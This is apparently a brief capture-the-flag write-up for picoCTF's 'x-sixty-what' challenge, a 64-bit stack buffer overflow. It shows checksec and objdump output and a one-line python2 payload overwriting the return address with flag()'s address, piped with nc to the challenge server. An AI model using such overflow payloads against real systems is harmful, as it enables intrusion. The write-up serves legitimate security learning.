# X-SIXTY-WHAT

- This challenge is a basic 64-bit buffer overflow.

- Program has no PIE, so it is pretty easy.

```
λ ~/x-sixty-what/ checksec --file=vuln

[*] '~/x-sixty-what/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- We just overwrite `64 bytes` of `buf` then 8 bytes of `RBP` and write 8 bytes address of `flag()` to `ret` of `vuln()`.

```
λ ~/x-sixty-what/ objdump -D vuln | grep "flag"
0000000000401236 <flag>:
  40125e:       75 29                   jne    401289 <flag+0x53>
```

- Run this bash command and we get the flag.

```
python2 -c 'print("a"*72 + "\x36\x12\x40\x00\x00\x00\x00\x00")' | nc saturn.picoctf.net 57066
```

> At this time, server looks like has a bug, so I can't receive the flag.